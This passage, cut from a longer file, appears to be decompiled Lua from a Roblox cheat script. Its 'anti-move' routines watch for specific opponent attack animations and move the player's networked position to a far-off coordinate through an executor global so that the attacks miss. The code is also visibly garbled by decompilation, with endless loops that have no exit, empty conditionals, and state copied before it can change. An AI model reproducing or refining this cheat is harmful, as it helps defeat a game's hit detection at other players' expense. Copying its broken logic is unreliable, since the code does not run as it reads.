                                            if antidebug then
                                                warn("[ANTI DEBUG] 14")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude <= 25 and not isCountering(hum) then
                                                while true do
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 14")
                                                    end
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    }
                                                    task.wait()
                                                    if (root.Position - targetRoot.Position).Magnitude > 25 or (not playedAnim.IsPlaying or (tick() >= tmp1234 + 1.5 or isCountering(hum))) then
                                                        getgenv().desync = nil
                                                    end
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1234 + 1.5 then
                                            task.wait(1)
                                            local tmp1235 = tick()
                                            while true do
                                                if true then
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 15")
                                                    end
                                                    if (root.Position - targetRoot.Position).Magnitude > 100 then
                                                    end
                                                    while true do
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 15")
                                                        end
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        }
                                                        task.wait()
                                                        if (root.Position - targetRoot.Position).Magnitude > 100 or (not playedAnim.IsPlaying or tick() >= tmp1235 + 1.5) then
                                                            getgenv().desync = nil
                                                        end
                                                    end
                                                end
                                                task.wait()
                                                if tick() >= tmp1235 + 1.5 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                    end
                                end
                                if playedAnimId:match("13083332742") and rawget(Options.AntiMoves_Genos.Value, "Anti Flamewave Cannon") then
                                    task.wait(1)
                                    local up1236 = Instance.new("Part", Workspace)
                                    up1236.Anchored = true
                                    up1236.Size = Vector3.new(12.5, 5, 1000)
                                    up1236.CanCollide = false
                                    up1236.Transparency = 1
                                    local up1237 = false
                                    local tmp1239 = up1236.Touched:Connect(function(arg1238)
                                        if arg1238 == root then
                                            up1237 = true
                                        end
                                    end)
                                    local tmp1241 = up1236.TouchEnded:Connect(function(arg1240)
                                        if arg1240 == root then
                                            up1237 = false
                                        end
                                    end)
                                    task.delay(0.25, function()
                                        up1236.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - up1236.Size.Z / 2)
                                    end)
                                    local tmp1242 = tick()
                                    local tmp1243 = up1236
                                    local tmp1244 = up1237
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] FLAMEWAVE CANNON")
                                            end
                                            if tmp1244 == true and not isDeathCountering(char) then
                                                while true do
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] FLAMEWAVE CANNON")
                                                    end
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    }
                                                    task.wait()
                                                    if tmp1244 == false or (tick() >= tmp1242 + 4 or (not playedAnim.IsPlaying or isDeathCountering(char))) then
                                                        getgenv().desync = nil
                                                    end
                                                end
                                            end
                                        end
                                        RenderStepped:Wait()
                                        if tick() >= tmp1242 + 4 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            if tmp1243 then
                                                tmp1243:Destroy()
                                            end
                                            tmp1239:Disconnect()
                                            tmp1241:Disconnect()
                                        end
                                    end
                                end
                                if playedAnimId:match("13146710762") and rawget(Options.AntiMoves_Genos.Value, "Anti Incinerate") then
                                    task.wait(3.25)
                                    if not targetChar:FindFirstChild("ForceField") then
                                    end
                                    local tmp1245 = Instance.new("Part", Workspace)
                                    tmp1245.Anchored = true
                                    tmp1245.Size = Vector3.new(100, 75, 400)
                                    tmp1245.CanCollide = false
                                    tmp1245.Transparency = 1
                                    local tmp1246 = Instance.new("Part", Workspace)
                                    tmp1246.Anchored = true
                                    tmp1246.Size = Vector3.new(100, 75, 400)
                                    tmp1246.CanCollide = false
                                    tmp1246.Transparency = 1
                                    local tmp1247 = Instance.new("Part", Workspace)
                                    tmp1247.Anchored = true
                                    tmp1247.Size = Vector3.new(100, 75, 400)
                                    tmp1247.CanCollide = false
                                    tmp1247.Transparency = 1
                                    local up1248 = false
                                    local up1249 = false
                                    local up1250 = false
                                    local tmp1251 = {}
                                    table.insert(tmp1251, tmp1245.Touched:Connect(function(arg1252)
                                        if arg1252 == root then
                                            up1248 = true
                                        end
                                    end))
                                    table.insert(tmp1251, tmp1245.TouchEnded:Connect(function(arg1253)
                                        if arg1253 == root then
                                            up1248 = false
                                        end
                                    end))
                                    table.insert(tmp1251, tmp1246.Touched:Connect(function(arg1254)
                                        if arg1254 == root then
                                            up1249 = true
                                        end
                                    end))
                                    table.insert(tmp1251, tmp1246.TouchEnded:Connect(function(arg1255)
                                        if arg1255 == root then
                                            up1249 = false
                                        end
                                    end))
                                    table.insert(tmp1251, tmp1247.Touched:Connect(function(arg1256)
                                        if arg1256 == root then
                                            up1250 = true
                                        end
                                    end))
                                    table.insert(tmp1251, tmp1247.TouchEnded:Connect(function(arg1257)
                                        if arg1257 == root then
                                            up1250 = false
                                        end
                                    end))
                                    tmp1245.CFrame = targetRoot.CFrame * CFrame.new(50, 0, - tmp1245.Size.Z / 2 + 2.5) * CFrame.Angles(0, math.rad(- 15), 0)
                                    tmp1246.CFrame = targetRoot.CFrame * CFrame.new(- 50, 0, - tmp1246.Size.Z / 2 + 2.5) * CFrame.Angles(0, math.rad(15), 0)
                                    tmp1247.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1247.Size.Z / 2 + 2.5)
                                    local tmp1258 = tick()
                                    local tmp1259 = up1250
                                    local tmp1260 = up1249
                                    local tmp1261 = up1248
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 17")
                                            end
                                            if (tmp1261 or (tmp1260 or tmp1259)) and not isDeathCountering(char) then
                                                while true do
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 17")
                                                    end
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    }
                                                    task.wait()
                                                    if not (tmp1261 or (tmp1260 or tmp1259)) or (tick() >= tmp1258 + 6 or isDeathCountering(char)) then
                                                        getgenv().desync = nil
                                                    end
                                                end
                                            end
                                        end
                                        RenderStepped:Wait()
                                        if tick() >= tmp1258 + 6 or not playedAnim.IsPlaying then
                                            tmp1245:Destroy()
                                            tmp1246:Destroy()
                                            tmp1247:Destroy()
                                            local tmp1262, tmp1263, tmp1264 = pairs(tmp1251)
                                            while true do
                                                local tmp1265
                                                tmp1264, tmp1265 = tmp1262(tmp1263, tmp1264)
                                                if tmp1264 == nil then
                                                    break
                                                end
                                                tmp1265:Disconnect()
                                            end
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("17278415853") and (targetChar:GetAttribute("Character") == "Esper" and rawget(Options.AntiMoves_Tatsumaki.Value, "Anti Terrible Tornado")) then
                                    task.wait(11)
                                    local tmp1266 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 18")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude > 100 then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 18")
                                                end
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if (root.Position - targetRoot.Position).Magnitude > 100 or tick() >= tmp1266 + 6 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1266 + 6 then
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("12342141464") and rawget(Options.AntiMoves_Garou.Value, "Anti Garou Ult") then
                                    task.wait(3.5)
                                    local tmp1267 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 19")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude > 125 then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 19")
                                                end
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if (root.Position - targetRoot.Position).Magnitude > 125 or tick() >= tmp1267 + 1.25 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1267 + 1.25 then
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("12460977270") and rawget(Options.AntiMoves_Garou.Value, "Anti Water Stream Rock Smashing Fist") then
                                    local tmp1268 = Instance.new("Part", Workspace)
                                    tmp1268.Anchored = true
                                    tmp1268.Size = Vector3.new(12.5, 5, 12.5)
                                    tmp1268.CanCollide = false
                                    tmp1268.Transparency = 1
                                    local up1269 = false
                                    local tmp1271 = tmp1268.Touched:Connect(function(arg1270)
                                        if arg1270 == root then
                                            up1269 = true
                                        end
                                    end)
                                    local tmp1273 = tmp1268.TouchEnded:Connect(function(arg1272)
                                        if arg1272 == root then
                                            up1269 = false
                                        end
                                    end)
                                    local tmp1274 = tick()
                                    local tmp1275 = up1269
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] WATER STREAM ROCK SMASHING FIST")
                                            end
                                            tmp1268.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1268.Size.Z / 2)
                                            if tmp1275 == true and not isCountering(hum) then
                                                while true do
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] WATER STREAM ROCK SMASHING FIST")
                                                    end
                                                    tmp1268.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1268.Size.Z / 2)
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    }
                                                    task.wait()
                                                    if tmp1275 == false or (tick() >= tmp1274 + 1.85 or (not playedAnim.IsPlaying or isCountering(hum))) then
                                                        getgenv().desync = nil
                                                    end
                                                end
                                            end
                                        end
                                        RenderStepped:Wait()
                                        if tick() >= tmp1274 + 1.85 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            if tmp1268 then
                                                tmp1268:Destroy()
                                            end
                                            tmp1271:Disconnect()
                                            tmp1273:Disconnect()
                                        end
                                    end
                                end
                                if playedAnimId:match("12463072679") and rawget(Options.AntiMoves_Garou.Value, "Anti Final Hunt") then
                                    local tmp1276 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 20")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude > 25 then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 20")
                                                end
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if (root.Position - targetRoot.Position).Magnitude > 25 or tick() >= tmp1276 + 0.75 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1276 + 0.75 then
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("14057231976") and rawget(Options.AntiMoves_Garou.Value, "Anti Rock Splitting Fist") then
                                    local tmp1277 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 31")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude > 10 then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 31")
                                                end
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if (root.Position - targetRoot.Position).Magnitude > 10 or tick() >= tmp1277 + 0.5 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1277 + 0.5 then
                                            getgenv().desync = nil
                                            task.wait(0.5)
                                            while true do
                                                if true then
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 31")
                                                    end
                                                    if (root.Position - targetRoot.Position).Magnitude <= 10 and not isCountering(hum) then
                                                        while true do
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] 31")
                                                            end
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            }
                                                            task.wait()
                                                            if (root.Position - targetRoot.Position).Magnitude > 10 or (tick() >= tmp1277 + 1.75 or isCountering(hum)) then
                                                                getgenv().desync = nil
                                                            end
                                                        end
                                                    end
                                                end
                                                task.wait()
                                                if tick() >= tmp1277 + 1.75 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                    end
                                end
                                if playedAnimId:match("13630786846") and rawget(Options.AntiMoves_Garou.Value, "Anti Crushed Rock") then
                                    local tmp1278 = Instance.new("Part", Workspace)
                                    tmp1278.Anchored = true
                                    tmp1278.Size = Vector3.new(25, 10, 75)
                                    tmp1278.CanCollide = false
                                    tmp1278.Transparency = 1
                                    local up1279 = false
                                    local tmp1281 = tmp1278.Touched:Connect(function(arg1280)
                                        if arg1280 == root then
                                            up1279 = true
                                        end
                                    end)
                                    local tmp1283 = tmp1278.TouchEnded:Connect(function(arg1282)
                                        if arg1282 == root then
                                            up1279 = false
                                        end
                                    end)
                                    local tmp1284 = tick()
                                    local tmp1285 = up1279
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 21")
                                            end
                                            tmp1278.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1278.Size.Z / 2)
                                            if tmp1285 == true and not isCountering(hum) then
                                                while true do
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 21")
                                                    end
                                                    tmp1278.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1278.Size.Z / 2)
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    }
                                                    task.wait()
                                                    if tmp1285 == false or (tick() >= tmp1284 + 1.5 or (not playedAnim.IsPlaying or isCountering(hum))) then
                                                        getgenv().desync = nil
                                                    end
                                                end
                                            end
                                        end
                                        RenderStepped:Wait()
                                        if tick() >= tmp1284 + 1.5 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            if tmp1278 then
                                                tmp1278:Destroy()
                                            end
                                            tmp1281:Disconnect()
                                            tmp1283:Disconnect()
                                        end
                                    end
                                end
                                if playedAnimId:match("72451715583225") and rawget(Options.AntiMoves_Garou.Value, "Anti Crushed Rock") then
                                    local tmp1286 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 20")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude > 15 then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 20")
                                                end
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if (root.Position - targetRoot.Position).Magnitude > 15 or tick() >= tmp1286 + 0.75 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1286 + 0.75 then
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("15391323441") and rawget(Options.AntiMoves_AtomicSamurai.Value, "Anti Atomic Samurai Ult") then
                                    task.wait(5.5)
                                    local tmp1287 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 22")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude > 125 then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 22")
                                                end
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if (root.Position - targetRoot.Position).Magnitude > 125 or tick() >= tmp1287 + 1 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1287 + 1 then
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("15520132233") and rawget(Options.AntiMoves_AtomicSamurai.Value, "Anti Sunset") then
                                    local tmp1288 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 23")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude <= 50 and not isDeathCountering(char) then
                                                while true do
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 23")
                                                    end
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    }
                                                    task.wait()
                                                    if (root.Position - targetRoot.Position).Magnitude > 50 or (tick() >= tmp1288 + 3.3 or (not playedAnim.IsPlaying or isDeathCountering(char))) then
                                                        getgenv().desync = nil
                                                    end
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1288 + 3.3 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            repeat
                                                task.wait()
                                            until tick() >= tmp1288 + 5.5
                                            while true do
                                                if true then
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 23")
                                                    end
                                                    if (root.Position - targetRoot.Position).Magnitude <= 100 and not isDeathCountering(char) then
                                                        while true do
                                                            if antidebug then
                                                                warn("[ANTI DEBUG] 23")
                                                            end
                                                            getgenv().desync = {
                                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                            }
                                                            task.wait()
                                                            if (root.Position - targetRoot.Position).Magnitude > 100 or (tick() >= tmp1288 + 6.5 or (not playedAnim.IsPlaying or isDeathCountering(char))) then
                                                                getgenv().desync = nil
                                                            end
                                                        end
                                                    end
                                                end
                                                task.wait()
                                                if tick() >= tmp1288 + 6.5 or not playedAnim.IsPlaying then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                    end
                                end
                                if playedAnimId:match("15676072469") and rawget(Options.AntiMoves_AtomicSamurai.Value, "Anti Solar Cleave") then
                                    local tmp1289 = Instance.new("Part", Workspace)
                                    tmp1289.Anchored = true
                                    tmp1289.Size = Vector3.new(50, 10, 150)
                                    tmp1289.CanCollide = false
                                    tmp1289.Transparency = 1
                                    local up1290 = false
                                    local tmp1292 = tmp1289.Touched:Connect(function(arg1291)
                                        if arg1291 == root then
                                            up1290 = true
                                        end
                                    end)
                                    local tmp1294 = tmp1289.TouchEnded:Connect(function(arg1293)
                                        if arg1293 == root then
                                            up1290 = false
                                        end
                                    end)
                                    local tmp1295 = tick()
                                    local tmp1296 = up1290
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 24")
                                            end
                                            tmp1289.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1289.Size.Z / 2)
                                            if tmp1296 and not isDeathCountering(char) then
                                                while true do
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 24")
                                                    end
                                                    tmp1289.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1289.Size.Z / 2)
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    }
                                                    task.wait()
                                                    if not tmp1296 or (tick() >= tmp1295 + 2 or (not playedAnim.IsPlaying or isDeathCountering(char))) then
                                                        getgenv().desync = nil
                                                    end
                                                end
                                            end
                                        end
                                        RenderStepped:Wait()
                                        if tick() >= tmp1295 + 2 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            if tmp1289 then
                                                tmp1289:Destroy()
                                            end
                                            tmp1292:Disconnect()
                                            tmp1294:Disconnect()
                                        end
                                    end
                                end
                                if playedAnimId:match("16082123712") and rawget(Options.AntiMoves_AtomicSamurai.Value, "Anti Atomic Slash") then
                                    task.wait(2.5)
                                    local tmp1297 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 25")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude > 50 then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 25")
                                                end
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if (root.Position - targetRoot.Position).Magnitude > 50 or tick() >= tmp1297 + 1.5 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1297 + 1.5 then
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("16057411888") and rawget(Options.AntiMoves_AtomicSamurai.Value, "Anti Atomic Slash Finisher") then
                                    task.wait(4.25)
                                    local tmp1298 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 26")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude > 50 then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 26")
                                                end
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if (root.Position - targetRoot.Position).Magnitude > 50 or tick() >= tmp1298 + 2 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1298 + 2 then
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("17857788598") and rawget(Options.AntiMoves_Suiryu.Value, "Anti Whirlwind Drop") then
                                    task.wait(0.65)
                                    if not playedAnim.IsPlaying then
                                    end
                                    local tmp1299 = Instance.new("Part", Workspace)
                                    tmp1299.Anchored = true
                                    tmp1299.Size = Vector3.new(35, 2048, 35)
                                    tmp1299.CanCollide = false
                                    tmp1299.Transparency = 1
                                    local up1300 = false
                                    local tmp1302 = tmp1299.Touched:Connect(function(arg1301)
                                        if arg1301 == root then
                                            up1300 = true
                                        end
                                    end)
                                    local tmp1304 = tmp1299.TouchEnded:Connect(function(arg1303)
                                        if arg1303 == root then
                                            up1300 = false
                                        end
                                    end)
                                    local tmp1305 = tick()
                                    local tmp1306 = up1300
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] ANTI WHIRLWIND DROP")
                                            end
                                            tmp1299.CFrame = targetRoot.CFrame
                                            if tmp1306 == true and not isCountering(hum) then
                                                while true do
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] ANTI WHIRLWIND DROP")
                                                    end
                                                    tmp1299.CFrame = targetRoot.CFrame
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    }
                                                    task.wait()
                                                    if tmp1306 == false or (tick() >= tmp1305 + 0.85 or (not playedAnim.IsPlaying or isCountering(hum))) then
                                                        getgenv().desync = nil
                                                    end
                                                end
                                            end
                                        end
                                        RenderStepped:Wait()
                                        if tick() >= tmp1305 + 0.85 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            if tmp1299 then
                                                tmp1299:Destroy()
                                            end
                                            tmp1302:Disconnect()
                                            tmp1304:Disconnect()
                                        end
                                    end
                                end
                                if playedAnimId:match("18435535291") and rawget(Options.AntiMoves_Suiryu.Value, "Anti Suiryu Ult") then
                                    task.wait(4.25)
                                    local tmp1307 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 35")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude > 100 then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 35")
                                                end
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if (root.Position - targetRoot.Position).Magnitude > 100 or tick() >= tmp1307 + 1.25 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1307 + 1.25 then
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("129651400898906") and rawget(Options.AntiMoves_Suiryu.Value, "Anti Grand Fissure") then
                                    task.wait(0.5)
                                    local tmp1308 = targetRoot.CFrame
                                    local tmp1309 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 34")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude > 75 then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 34")
                                                end
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if (root.Position - targetRoot.Position).Magnitude > 75 or (tick() >= tmp1309 + 1.25 or not playedAnim.IsPlaying) then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1309 + 1.25 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            task.wait(1)
                                            while true do
                                                if true then
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 34")
                                                    end
                                                    if (root.Position - tmp1308.Position).Magnitude > 75 then
                                                    end
                                                    while true do
                                                        if antidebug then
                                                            warn("[ANTI DEBUG] 34")
                                                        end
                                                        getgenv().desync = {
                                                            CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                        }
                                                        task.wait()
                                                        if (root.Position - tmp1308.Position).Magnitude > 75 or tick() >= tmp1309 + 3 then
                                                            getgenv().desync = nil
                                                        end
                                                    end
                                                end
                                                task.wait()
                                                if tick() >= tmp1309 + 3 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                    end
                                end
                                if playedAnimId:match("18896229321") and rawget(Options.AntiMoves_Suiryu.Value, "Anti Twin Fangs") then
                                    local tmp1310 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 33")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude <= 15 and not isCountering(hum) then
                                                while true do
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 33")
                                                    end
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    }
                                                    task.wait()
                                                    if (root.Position - targetRoot.Position).Magnitude > 15 or (tick() >= tmp1310 + 3.5 or (not playedAnim.IsPlaying or isCountering(hum))) then
                                                        getgenv().desync = nil
                                                    end
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1310 + 3.5 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            task.wait(1)
                                            if not playedAnim.IsPlaying then
                                            end
                                            if antidebug then
                                                warn("[ANTI DEBUG] 33")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude <= 25 then
                                                while true do
                                                    if antidebug then
                                                        warn("[ANTI DEBUG] 33")
                                                    end
                                                    getgenv().desync = {
                                                        CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                    }
                                                    task.wait()
                                                    if (root.Position - targetRoot.Position).Magnitude > 25 or (tick() >= tmp1310 + 5.5 or not playedAnim.IsPlaying) then
                                                        getgenv().desync = nil
                                                    end
                                                end
                                            end
                                            task.wait()
                                            if tick() < tmp1310 + 5.5 and playedAnim.IsPlaying then
                                            end
                                        end
                                    end
                                end
                                if playedAnimId:match("18897119503") and rawget(Options.AntiMoves_Suiryu.Value, "Anti Earth Splitting Strike") then
                                    local tmp1311 = Instance.new("Part", Workspace)
                                    tmp1311.Anchored = true
                                    tmp1311.Size = Vector3.new(35, 10, 75)
                                    tmp1311.CanCollide = false
                                    tmp1311.Transparency = 1
                                    local up1312 = false
                                    local tmp1314 = tmp1311.Touched:Connect(function(arg1313)
                                        if arg1313 == root then
                                            up1312 = true
                                        end
                                    end)
                                    local tmp1316 = tmp1311.TouchEnded:Connect(function(arg1315)
                                        if arg1315 == root then
                                            up1312 = false
                                        end
                                    end)
                                    local tmp1317 = tick()
                                    local tmp1318 = up1312
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 33")
                                            end
                                            tmp1311.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1311.Size.Z / 2)
                                            if tmp1318 ~= true then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 33")
                                                end
                                                tmp1311.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1311.Size.Z / 2)
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if tmp1318 == false or (tick() >= tmp1317 + 2.5 or not playedAnim.IsPlaying) then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        RenderStepped:Wait()
                                        if tick() >= tmp1317 + 2.5 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            if tmp1311 then
                                                tmp1311:Destroy()
                                            end
                                            tmp1314:Disconnect()
                                            tmp1316:Disconnect()
                                        end
                                    end
                                end
                                if playedAnimId:match("106755459092436") and rawget(Options.AntiMoves_Suiryu.Value, "Anti Last Breath") then
                                    MoveNotify(plr, "Last Breath")
                                    task.wait(3)
                                    if not (isAnimPlaying(targetHum, "106755459092436") or isAnimPlaying(targetHum, "132259592388175")) then
                                    end
                                    local tmp1319 = tick()
                                    while true do
                                        if antidebug then
                                            warn("[ANTI DEBUG] 32")
                                        end
                                        if isAnimPlaying(targetHum, "106755459092436") or isAnimPlaying(targetHum, "132259592388175") then
                                            repeat
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                            until tick() >= tmp1319 + 3.5 or not (isAnimPlaying(targetHum, "106755459092436") or isAnimPlaying(targetHum, "132259592388175"))
                                            getgenv().desync = nil
                                        end
                                        task.wait()
                                        if tick() >= tmp1319 + 3.5 then
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("75502010126640") and rawget(Options.AntiMoves_Suiryu.Value, "Anti Last Breath") then
                                    task.wait(10)
                                    local tmp1320 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 18")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude > 100 then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 18")
                                                end
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
